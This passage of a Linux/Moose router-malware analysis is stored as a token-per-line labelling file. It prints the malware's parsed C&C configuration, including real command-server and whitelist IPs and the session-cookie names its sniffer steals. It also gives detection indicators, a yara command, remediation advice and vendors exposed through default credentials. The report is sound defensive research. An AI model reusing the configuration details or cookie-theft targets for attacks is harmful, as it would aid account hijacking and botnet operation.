protocol O
takes O
the O
following O
form O
. O

module O
. O

Where O
these O
flags O
can O
be O
enabled O
or O
not O
in O
the O
additional O
configuration O
field O
. O

Each O
item O
of O
the O
whitelist O
is O
sent O
in O
the O
following O
format O
. O

The O
number O
of O
entries O
is O
the O
previously O
described O
whitelist O
size O
. O

Each O
item O
of O
the O
sniffer O
configuration O
is O
sent O
in O
the O
following O
format O
. O

The O
number O
of O
entries O
is O
the O
previously O
described O
sniffer O
configuration O
size O
. O

Here O
is O
the O
example O
configuration O
shown O
in O
the O
screenshot O
after O
being O
parsed O
by O
our O
Python O
tool O
( O
username O
and O
password O
list O
skipped O
for O
brevity O
) O
. O

Dissecting O
Linux O
/ O
Moose O
An O
example O
request O
to O
the O
configuration O
C&C O
server O
$ O
./parse_cnc_request.py O
cfgcnc.raw O
{ O
' O
cnc_request_flags O
. O
BRUTEFORCE_LIST O
' O
: O
True O
, O
' O
cnc_request_flags O
. O
WRITE_ACCESS O
' O
: O
True O
, O
' O
loop_count O
' O
: O
453 O
, O
' O
msg_type O
' O
: O
1 O
, O
' O
msg_type_decoded O
' O
: O
' O
REQUEST_CONFIG O
' O
, O
' O
nb_extscans O
' O
: O
294 O
, O
' O
nb_ifscans O
' O
: O
9 O
, O
' O
nb_killed O
' O
: O
0 O
, O
' O
nb_localscans O
' O
: O
571 O
, O
' O
version O
' O
: O
28 O
} O
An O
example O
response O
from O
the O
configuration O
C&C O
server O
$ O
./parse_cnc_config.py O
4h O
cfgcnc-response.raw O
{ O
' O
cnccfg_ext_ip O
' O
: O
' O
< O
redacted O
> O
' O
, O
' O
cnccfg_flag_hijackdns O
' O
: O
False O
, O
' O
cnccfg_flag_killprocess O
' O
: O
True O
, O
' O
cnccfg_flag_nattraversal O
' O
: O
True O
, O
' O
cnccfg_flag_noextscan O
' O
: O
False O
, O
' O
cnccfg_flag_nolocalscan O
' O
: O
False O
, O
' O
cnccfg_flag_recontactcnc O
' O
: O
True O
, O
' O
cnccfg_flag_scanner_sniffer O
' O
: O
True O
, O
' O
cnccfg_flag_share_peers O
' O
: O
False O
, O
' O
cnccfg_flag_test10073 O
' O
: O
True O
, O
' O
cnccfg_flag_thd_sniffer O
' O
: O
True O
, O
' O
cnccfg_hijackdns1_ip O
' O
: O
0 O
, O
' O
cnccfg_hijackdns2_ip O
' O
: O
0 O
, O
' O
cnccfg_nb_thdscan_ext O
' O
: O
10 O
, O
' O
cnccfg_nb_thdscan_local O
' O
: O
20 O
, O
' O
cnccfg_proxy_max_clients O
' O
: O
5 O
, O
' O
cnccfg_relaycnc_ip O
' O
: O
' O
93.190.140.221 O
' O
, O
' O
cnccfg_relaycnc_sleep O
' O
: O
10 O
, O
' O
cnccfg_relaycnc_timeout O
' O
: O
600 O
, O
' O
cnccfg_reportcnc_ip O
' O
: O
' O
85.159.237.107 O
' O
, O
' O
snfcfg_00_needle O
' O
: O
' O
twll= O
' O
, O
' O
snfcfg_01_needle O
' O
: O
' O
twid= O
' O
, O
' O
snfcfg_02_needle O
' O
: O
' O
LOGIN_INFO= O
' O
, O
' O
snfcfg_03_needle O
' O
: O
' O
c_user= O
' O
, O
' O
snfcfg_04_needle O
' O
: O
' O
ds_user_id= O
' O
, O
' O
snfcfg_05_needle O
' O
: O
' O
SAPISID= O
' O
, O
' O
snfcfg_06_needle O
' O
: O
' O
APISID= O
' O
, O
' O
snfcfg_07_needle O
' O
: O
' O
PLAY_ACTIVE_ACCOUNT= O
' O
, O
' O
snfcfg_nb_items O
' O
: O
8 O
, O
' O
userpass_list_len O
' O
: O
4475 O
, O
... O
, O
' O
whitelist_len O
' O
: O
57 O
, O
' O
whlst_00_can_email O
' O
: O
False O
, O
' O
whlst_00_ip O
' O
: O
' O
77.247.177.31 O
' O
, O
' O
whlst_01_can_email O
' O
: O
True O
, O
' O
whlst_01_ip O
' O
: O
' O
85.159.237.107 O
' O
, O
' O
whlst_02_can_email O
' O
: O
False O
, O
' O
whlst_02_ip O
' O
: O
' O
85.159.237.108 O
' O
, O
' O
whlst_03_can_email O
' O
: O
True O
, O
' O
whlst_03_ip O
' O
: O
' O
192.168.1.3 O
' O
, O
... O
, O
' O
whlst_56_can_email O
' O
: O
False O
, O
' O
whlst_56_ip O
' O
: O
' O
103.238.216.218 O
' O
} O
Dissecting O
Linux O
/ O
Moose O
Version O
20 O
Version O
28 O
to O
29 O
Version O
29 O
to O
31 O
Linux O
/ O
Moose O
is O
a O
novelty O
when O
you O
consider O
that O
most O
embedded O
threats O
these O
days O
are O
used O
to O
perform O
DDoS O
attacks O
. O

Considering O
the O
rudimentary O
techniques O
used O
by O
Moose O
in O
order O
to O
gain O
access O
to O
other O
devices O
, O
it O
is O
unfortunate O
that O
the O
security O
of O
embedded O
devices O
is O
n't O
taken O
more O
seriously O
by O
vendors O
. O

With O
the O
increasing O
connectivity O
and O
proliferation O
of O
Linux O
- O
based O
devices O
, O
something O
will O
need O
to O
be O
done O
in O
that O
area O
. O

We O
hope O
that O
this O
publication O
will O
help O
vendors O
better O
understand O
how O
the O
malicious O
actors O
are O
targeting O
their O
devices O
. O

As O
knowledgeable O
IT O
people O
, O
most O
of O
us O
already O
check O
if O
patches O
are O
installed O
or O
if O
anti O
- O
virus O
software O
is O
updated O
and O
operating O
when O
we O
visit O
friends O
and O
relatives O
. O

With O
all O
the O
embedded O
threats O
out O
there O
, O
we O
will O
need O
to O
add O
a O
quick O
check O
of O
their O
router O
to O
that O
to O
- O
do O
list O
. O

Consider O
contributing O
to O
our O
potentially O
targeted O
vendor O
list O
if O
you O
find O
anything O
. O

Unfortunately O
, O
this O
type O
of O
animal O
is O
far O
from O
extinct O
. O

Here O
are O
the O
SHA1 O
hashes O
, O
architecture O
and O
malware O
version O
of O
the O
files O
we O
've O
encountered O
. O

Network O
- O
based O
Indicators O
Traffic O
patterns O
Traffic O
from O
infected O
device O
to O
these O
IP O
: O
ports O
combinations O
using O
TCP O
Traffic O
from O
these O
IP O
addresses O
( O
the O
whitelist O
) O
going O
to O
infected O
device O
on O
TCP O
port O
10073 O
Host O
- O
based O
Indicators O
This O
last O
indicator O
can O
be O
verified O
using O
netstat O
-anp O
. O

Depending O
on O
system O
configuration O
the O
-p O
flag O
might O
not O
be O
available O
. O

If O
it O
's O
not O
, O
then O
you O
can O
look O
for O
lsof O
or O
try O
manually O
correlating O
the O
content O
of O
/proc O
/ O
net O
/ O
tcp/ O
with O
/proc/<pid>/fd O
as O
explained O
here O
. O

Detection O
( O
yara O
) O
In O
order O
to O
identify O
if O
a O
file O
or O
a O
set O
of O
files O
is O
the O
Linux O
/ O
Moose O
threat O
you O
can O
use O
the O
popular O
yara O
tool O
. O

Using O
the O
linux-moose.yar O
Yara O
rule O
available O
from O
our O
github O
repository O
you O
can O
recursively O
crawl O
a O
directory O
for O
Linux O
/ O
Moose O
with O
. O

yara O
-r O
linux-moose.yar O
directory/ O
If O
the O
command O
yields O
no O
output O
then O
no O
files O
were O
identified O
to O
be O
Linux O
/ O
Moose O
. O

Otherwise O
identified O
filenames O
are O
printed O
. O

Further O
modifications O
made O
by O
the O
malware O
author O
to O
evade O
detection O
will O
impact O
the O
usefulness O
of O
this O
Yara O
rule O
over O
time O
. O

Reboot O
the O
affected O
device O
then O
change O
its O
password O
as O
soon O
as O
possible O
. O

Keep O
in O
mind O
, O
however O
, O
that O
the O
compromised O
system O
was O
accessible O
via O
credentials O
that O
the O
operators O
knew O
, O
that O
they O
were O
aware O
of O
its O
IP O
address O
and O
they O
had O
means O
to O
access O
its O
interactive O
console O
. O

They O
might O
have O
had O
manual O
access O
, O
which O
means O
that O
further O
infection O
is O
possible O
, O
including O
permanent O
firmware O
modifications O
( O
the O
link O
is O
in O
German O
) O
. O

A O
factory O
reset O
, O
firmware O
update O
or O
reinstall O
and O
password O
change O
is O
probably O
best O
. O

Change O
default O
passwords O
on O
network O
equipment O
even O
if O
it O
is O
not O
reachable O
from O
the O
Internet O
. O

Disable O
Telnet O
login O
and O
use O
SSH O
where O
possible O
. O

Make O
sure O
that O
your O
router O
is O
not O
accessible O
from O
the O
Internet O
on O
ports O
22 O
( O
SSH O
) O
, O
23 O
( O
Telnet O
) O
, O
80 O
( O
HTTP O
) O
and O
443 O
( O
HTTPS O
) O
. O

If O
you O
are O
unsure O
about O
how O
to O
perform O
this O
test O
, O
when O
you O
are O
at O
home O
, O
use O
the O
" O
common O
ports O
" O
scan O
from O
the O
ShieldsUP O
service O
from O
GRC.com O
. O

Make O
sure O
that O
the O
above O
mentioned O
ports O
receive O
a O
Stealth O
or O
Closed O
status O
. O

Running O
the O
latest O
firmware O
available O
from O
your O
embedded O
device O
vendor O
is O
also O
recommended O
. O

Note O
To O
obtain O
the O
latest O
version O
of O
this O
list O
check O
our O
malware O
- O
research O
github O
page O
We O
have O
cross O
- O
referenced O
the O
list O
of O
usernames O
and O
passwords O
that O
Moose O
uses O
in O
order O
to O
spread O
with O
a O
list O
of O
vendors O
known O
to O
have O
these O
as O
default O
credentials O
and O
confirmed O
that O
some O
of O
their O
products O
have O
Telnet O
access O
enabled O
. O

Here O
is O
the O
list O
of O
potentially O
targeted O
vendors O
we O
've O
come O
up O
using O
this O
methodology O
: O
Network O
equipment O
vendors O
3Com O
, O
Alcatel O
- O
Lucent O
, O
Allied O
Telesis O
, O
Avaya O
, O
Belkin O
, O
Brocade O
, O
Buffalo O
, O
Celerity O
, O
Cisco O
, O
D O
- O
link O
, O
Enterasys O
, O
Hewlett O
- O
Packard O
, O
Huawei O
, O
Linksys O
, O
Mikrotik O
, O
Netgear O
, O
Meridian O
, O
Nortel O
, O
SpeedStream O
, O
Thomson O
, O
TP O
- O
Link O
, O
Zhone O
, O
ZyXEL O
Appliances O
vendors O
APC O
, O
Brother O
, O
Konica O
/ O
Minolta O
, O
Kyocera O
, O
Microplex O
, O
Ricoh O
, O
Toshiba O
, O
Xerox O
Internet O
of O
Things O
vendors O
Hik O
Vision O
, O
Leviton O
Keep O
in O
mind O
that O
this O
is O
a O
list O
of O
potentially O
targeted O
vendors O
. O

Current O
Moose O
versions O
need O
some O
Unix O
- O
type O
shell O
access O
in O
order O
to O
infect O
a O
machine O
where O
it O
successfully O
logged O
in O
. O

On O
some O
devices O
this O
type O
of O
access O
is O
hidden O
behind O
another O
set O
of O
credentials O
or O
tech O
- O
support O
secret O
passwords O
. O

Moose O
does O
n't O
target O
these O
environments O
. O

Since O
we O
do O
n't O
have O
access O
to O
the O
hardware O
for O
testing O
we O
could O
n't O
validate O
this O
aspect O
in O
the O
above O
lists O
. O

If O
you O
have O
access O
to O
any O
of O
this O
hardware O
please O
let O
us O
know O
. O

If O
the O
credentials O
can O
be O
used O
via O
Telnet O
to O
login O
, O
if O
Telnet O
is O
enabled O
by O
default O
and O
if O
a O
shell O
access O
can O
be O
obtained O
by O
typing O
sh O
in O
the O
device O
's O
prompt O
, O
then O
these O
are O
very O
good O
indicators O
that O
a O
device O
could O
be O
infected O
by O
Linux O
/ O
Moose O
. O

The O
last O
list O
below O
contains O
vendors O
that O
were O
correlated O
using O
the O
default O
credentials O
list O
as O
previously O
mentioned O
but O
that O
we O
were O
not O
able O
to O
gather O
information O
about O
if O
they O
had O
Telnet O
access O
enabled O
or O
not O
. O

Ericsson O
, O
F5 O
Networks O
, O
Fortinet O
, O
Siemens O
, O
LSI O
Corporation O
, O
Maxim O
Integrated O
, O
Accelerated O
Network O
, O
Quantum O
, O
Advantek O
, O
Airtel O
, O
AirTies O
, O
Radware O
, O
Ubee O
Interactive O
, O
AOC O
, O
Applied O
Innovations O
, O
Arescom O
, O
ARtem O
, O
Asante O
, O
Ascend O
, O
ATL O
, O
Atlantis O
, O
AVM O
, O
Avocent O
, O
Axis O
, O
Aztech O
, O
Bay O
Networks O
, O
Bintec O
, O
BMC O
, O
Broadlogic O
, O
Canyon O
, O
Cellit O
, O
Ciphertrust O
, O
CNet O
, O
Compaq O
, O
Comtrend O
, O
Conceptronic O
, O
Conexant O
, O
Corecess O
, O
CTC O
Union O
, O
Cyclades O
, O
Davox O
, O
Demarc O
, O
Digicom O
, O
Draytek O
, O
Dynalink O
, O
E O
- O
Con O
, O
Efficient O
, O
Everfocus O
, O
Flowpoint O
, O
Gericom O
, O
IBM O
, O
iDirect O
, O
Inchon O
, O
Infacta O
, O
Infoblox O
, O
INOVA O
, O
Interbase O
, O
Intermec O
, O
Intracom O
, O
JD O
Edwards O
, O
Kasda O
, O
KTI O
, O
Lantronix O
, O
Laxo O
, O
LG O
, O
Livingston O
, O
Marconi O
, O
McAfee O
, O
McData O
, O
Mentec O
, O
Micronet O
, O
Milan O
, O
Motorola O
, O
Mro O
software O
, O
Netopia O
, O
Netport O
, O
Netscreen O
, O
Netstar O
, O
Niksun O
, O
Nokia O
, O
NOMADIX O
, O
Olitec(trendchip O
) O
, O
OpenConnect O
, O
Osicom O
, O
Overland O
, O
Ovislink O
, O
Pansonic O
, O
Phoenix O
, O
Pirelli O
, O
Planet O
, O
Ptcl O
, O
QLogic O
, O
Quintum O
Technologies O
, O
RM O
, O
RoamAbout O
, O
Sagem O
, O
Samsung O
, O
Server O
TechnologyPower O
, O
Sharp O
, O
Signamax O
, O
Siips O
, O
Silex O
Technology O
, O
Simple O
Smdr O
, O
Sitecom O
, O
Smartswitch O
, O
SMC O
, O
Sonic O
- O
X O
, O
Spectra O
Logic O
, O
SpeedXess O
, O
Sphairon O
, O
SSA O
, O
Stratacom O
, O
Swissvoice O
, O
Symbol O
, O
System/32 O
, O
Tandem O
, O
Telewell O
, O
Telindus O
, O
Tellabs O
, O
Topsec O
, O
Troy O
, O
TVT O
System O
, O
U.S. O

Robotics O
, O
Unisys O
, O
VASCO O
, O
VxWorks O
, O
Wang O
, O
Weidm O
eller O
, O
Westell O
, O
X O
- O
Micro O
, O
xd O
, O
Xylan O
, O
Xyplex O
, O
Zebra O
, O
ZTE O
If O
you O
know O
that O
a O
particular O
vendor O
make O
and O
model O
that O
could O
be O
affected O
please O
contact O
us O
and O
contact O
them O
. O

